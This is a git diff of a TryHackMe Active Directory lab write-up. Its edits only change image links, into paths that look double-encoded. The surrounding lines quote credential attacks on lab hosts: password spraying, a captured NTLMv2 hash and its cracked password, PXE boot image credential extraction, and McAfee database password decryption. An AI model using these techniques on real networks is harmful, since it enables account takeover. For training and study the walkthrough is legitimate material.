@@ -130,7 +130,7 @@ Phishing is another excellent method to breach AD. Phishing usually entices 
 
 A detailed room on phishing can be found [here.](https://tryhackme.com/module/phishing)
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250526123341.png)
+![](cybersecurity/images/Pasted%2520image%252020250526123341.png)
 
 
 # NTLM Authenticated Services
@@ -262,11 +262,11 @@ kali@kali:~/AD$ python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.c
 
 Now, if we login with any credentials:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250526130951.png)
+![](cybersecurity/images/Pasted%2520image%252020250526130951.png)
 
 We got our answers:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250526131002.png)
+![](cybersecurity/images/Pasted%2520image%252020250526131002.png)
 
 
   
@@ -631,7 +631,7 @@ As seen, we got our password:
 tryhackmeldappass1@
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250526134159.png)
+![](cybersecurity/images/Pasted%2520image%252020250526134159.png)
 
 # Authentication Relays
 
@@ -731,7 +731,7 @@ We need to leave it here for a while, it should take around 10 minutes, after a 
 [SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:2b968c28c0e8f215:9AF58F4A3B1A70D6700063DDE9DCC03C:010100000000000080746EF951CEDB01EA9BEFE2F902C8FA0000000002000800480046005900440001001E00570049004E002D004A004700390037004F00380033004500470033004D0004003400570049004E002D004A004700390037004F00380033004500470033004D002E0048004600590044002E004C004F00430041004C000300140048004600590044002E004C004F00430041004C000500140048004600590044002E004C004F00430041004C000700080080746EF951CEDB010600040002000000080030003000000000000000000000000020000051022B4F873745C7BFA1D22A2E8EE4DFE30D92A8C3C796FDFC877CD2E330DCF60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00320035002E00350033000000000000000000
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250526142956.png)
+![](cybersecurity/images/Pasted%2520image%252020250526142956.png)
 
 Now, we need to crack the hash, let's store it on a file first:
 
@@ -750,7 +750,7 @@ After some short time, we get:
 ```
 SVCFILECOPY::ZA:2b968c28c0e8f215:9af58f4a3b1a70d6700063dde9dcc03c:010100000000000080746ef951cedb01ea9befe2f902c8fa0000000002000800480046005900440001001e00570049004e002d004a004700390037004f00380033004500470033004d0004003400570049004e002d004a004700390037004f00380033004500470033004d002e0048004600590044002e004c004f00430041004c000300140048004600590044002e004c004f00430041004c000500140048004600590044002e004c004f00430041004c000700080080746ef951cedb010600040002000000080030003000000000000000000000000020000051022b4f873745c7bfa1d22a2e8ee4dfe30d92a8c3c796fdfc877cd2e330dcf60a001000000000000000000000000000000000000900200063006900660073002f00310030002e00350030002e00320035002e00350033000000000000000000:FPassword1!
 ```
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250526143244.png)
+![](cybersecurity/images/Pasted%2520image%252020250526143244.png)
 
 We found the password:
 
@@ -758,7 +758,7 @@ We found the password:
 FPassword1!
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250526143255.png)
+![](cybersecurity/images/Pasted%2520image%252020250526143255.png)
 
 
 
@@ -891,7 +891,7 @@ Password1@
 ```
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250526145243.png)
+![](cybersecurity/images/Pasted%2520image%252020250526145243.png)
 
 Inside of here, we need to create a working directory for our user:
 
@@ -910,9 +910,9 @@ tftp -i (Resolve-DnsName thmmdt.za.tryhackme.com).IPAddress GET "\Tmp\x64{69D56F
 
 >Note: The name of the `.bcd` file can change, you need to check it by going to `http://pxeboot.za.tryhackme.com/`
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250526145737.png)
+![](cybersecurity/images/Pasted%2520image%252020250526145737.png)
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250526145757.png)
+![](cybersecurity/images/Pasted%2520image%252020250526145757.png)
 
 As seen, the file successfully downloaded, we now need to analyze the boot image, for this, we need to use `powerpxe`:
 
@@ -923,7 +923,7 @@ Get-WimFile -bcdFile $bcdfile
 ```
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250526145924.png)
+![](cybersecurity/images/Pasted%2520image%252020250526145924.png)
 
 Nice, we now know the path to download the image, we need to do this, it may take a while:
 
@@ -934,7 +934,7 @@ tftp -i $mdtserver GEt "$wimfile" pxeboot.wim
 ```
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250526150308.png)
+![](cybersecurity/images/Pasted%2520image%252020250526150308.png)
 
 As seen, it took a while, we now need to retrieve the credentials to finish:
 
@@ -949,11 +949,11 @@ Get-FindCredentials -WimFile .\pxeboot.wim
 
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250526150415.png)
+![](cybersecurity/images/Pasted%2520image%252020250526150415.png)
 
 There we go, we got the credentials.
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250526150453.png)
+![](cybersecurity/images/Pasted%2520image%252020250526150453.png)
 
 
 # Configuration Files
@@ -1050,7 +1050,7 @@ scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
 Password1@
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250526152524.png)
+![](cybersecurity/images/Pasted%2520image%252020250526152524.png)
 
 With the db in our machine, we can do:
 
@@ -1060,7 +1060,7 @@ sqlitebrowser ma.db
 
 We will notice this on the `AGENT_REPOSITORIES` table:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250526152739.png)
+![](cybersecurity/images/Pasted%2520image%252020250526152739.png)
 
 We can see the `AUTH_PASSWD` for `svcAV` user, let's copy this value and use our tool (`We can find the tool on the downloadable task files`)
 
@@ -1076,7 +1076,7 @@ python3 mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFX
 
 We can see this output:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250526153507.png)
+![](cybersecurity/images/Pasted%2520image%252020250526153507.png)
 
 We got our password:
 
@@ -1084,7 +1084,7 @@ We got our password:
 MyStrongPassword!
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250526153536.png)
+![](cybersecurity/images/Pasted%2520image%252020250526153536.png)
 
 # Conclusion
 
